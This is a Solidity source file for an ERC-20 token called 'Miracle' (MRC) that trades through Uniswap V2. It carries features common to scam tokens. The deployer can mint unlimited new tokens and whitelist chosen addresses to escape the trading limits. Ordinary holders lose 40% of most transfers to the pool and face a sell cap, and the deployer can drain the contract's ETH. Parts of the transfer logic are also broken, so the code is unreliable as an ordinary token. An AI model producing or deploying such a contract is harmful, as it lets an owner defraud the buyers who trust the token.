// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

// SafeMath Functions
contract SafeMath {
    // This contract provides safe mathematical operations to prevent overflow and underflow.

    // Add two uint256 numbers and check for overflow
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    // Subtract two uint256 numbers and check for underflow
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    // Multiply two uint256 numbers and check for overflow
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    // Divide two uint256 numbers and check for division by zero
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}

// IERC20 Interface
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

// IUniswapV2Router and IUniswapV2Factory Interfaces
interface IUniswapV2Router {
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

// Main Miracle Token Contract
contract Miracle is SafeMath, IERC20 {
    // Token details
    string public name = "Miracle";
    string public symbol = "MRC";
    uint8 public decimals = 18;
    uint256 public totalSupply = 5000000 * 10**uint256(decimals);

    // Contract owner and Uniswap router and factory addresses
    address private _deployer;
    address public routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router public uniswapV2Router = IUniswapV2Router(routerAddress);
    address public factoryAddress = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    IUniswapV2Factory public uniswapV2Factory = IUniswapV2Factory(factoryAddress);

    // Balances, allowances, and purchase/sale tracking
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _cumulativePurchases;
    mapping(address => uint256) private _cumulativeSales;

    address public liquidityPool = address(0);
    uint256 public maxBuyPercent = 4;
    uint256 public maxSellPercent = 60;

    // Whitelisted addresses
    mapping(address => bool) public whitelistedAddresses;

    // Events for transfers and approvals
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    // Constructor
    constructor() {
        _deployer = msg.sender;
        _balances[msg.sender] = totalSupply;
    }
    
    // Modifier to restrict access to only the contract deployer
    modifier onlyDeployer() {
        require(msg.sender == _deployer, "Only deployer can call this function"); 
        _;
    }

    // ERC-20: Approve from the zero address should be disallowed
    // Internal approve function
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: Approve from the zero address");
        require(spender != address(0), "ERC20: Approve to the zero address");

        _allowances[owner][spender] = amount;
        
        emit Approval(owner, spender, amount);
    }

    // ERC-20: Transfer from the zero address should be disallowed
    // Internal transfer function
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: Transfer from the zero address");
        require(recipient != address(0), "ERC20: Transfer to the zero address");
        require(_balances[sender] >= amount, "ERC20: Insufficient balance");
        
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        
        emit Transfer(sender, recipient, amount);
    }

    // ...

    // Transfer function with custom logic for handling pool and holder amounts
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        uint256 poolAmount = amount * 40 / 100; 
        uint256 holderAmount = amount - poolAmount; 
        
        if (recipient != liquidityPool && !whitelistedAddresses[msg.sender]) {
            require(_cumulativePurchases[msg.sender] + holderAmount <= totalSupply * maxBuyPercent / 100, "Exceeds the max buy limit");
            _cumulativePurchases[msg.sender] += holderAmount;
            _transfer(msg.sender, liquidityPool, poolAmount);
        }
        if (recipient == liquidityPool && !whitelistedAddresses[msg.sender]) {
            require(_balances[msg.sender] * maxSellPercent / 100 >= holderAmount, "Exceeds the max sell limit");
            _cumulativeSales[msg.sender] += holderAmount;
        }
        _transfer(msg.sender, recipient, holderAmount);
        return true;
    }
    
    // Approve function
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    // TransferFrom function with custom logic for handling pool and holder amounts
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        uint256 poolAmount = amount * 40 / 100; 
        uint256 holderAmount = amount - poolAmount; 

        if (recipient != liquidityPool && !whitelistedAddresses[sender]) {
            _transfer(sender, liquidityPool, poolAmount);
        }

        if (recipient == liquidityPool && !whitelistedAddresses[sender]) {
            require(_balances[sender] * maxSellPercent / 100 >= holderAmount, "Exceeds the max sell limit");
        }

        _transfer(sender, recipient, holderAmount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    // Get the balance of a specific account
    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    // Get the allowance for a specific owner and spender
    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    // Add an address to the whitelist
    function addWhitelisted(address account) external onlyDeployer {
        whitelistedAddresses[account] = true;
    }

    // Remove an address from the whitelist
    function removeWhitelisted(address account) external onlyDeployer {
        whitelistedAddresses[account] = false;
    }

    // Check if an address is whitelisted
    function isWhitelisted(address account) public view returns (bool) {
        return whitelistedAddresses[account];
    }

// Ensure liquidity can be set only once
bool public isLiquiditySet = false;

// Function to manually set the liquidity pool address after adding liquidity to Uniswap
function setLiquidityPoolAddress() external onlyDeployer {
    require(!isLiquiditySet, "Liquidity is already set!");
    liquidityPool = uniswapV2Factory.getPair(address(this), uniswapV2Router.WETH());
    require(liquidityPool != address(0), "Invalid liquidity pool address");
    isLiquiditySet = true;
}

    // Mint new tokens (onlyDeployer modifier)
    function mint(uint256 amount) external onlyDeployer {
        require(amount > 0, "Amount must be greater than zero");
        totalSupply = SafeMath.add(totalSupply, amount);
        _balances[msg.sender] = SafeMath.add(_balances[msg.sender], amount);
        emit Transfer(address(0), msg.sender, amount);
    }

    // Withdraw ETH from the contract (onlyDeployer modifier)
    function withdrawETH() external onlyDeployer {
        uint256 balance = address(this).balance;
        require(balance > 0, "Contract has no ETH balance to withdraw");
        payable(msg.sender).transfer(balance);
    }

    // Receive function to accept Ether
receive() external payable {}

}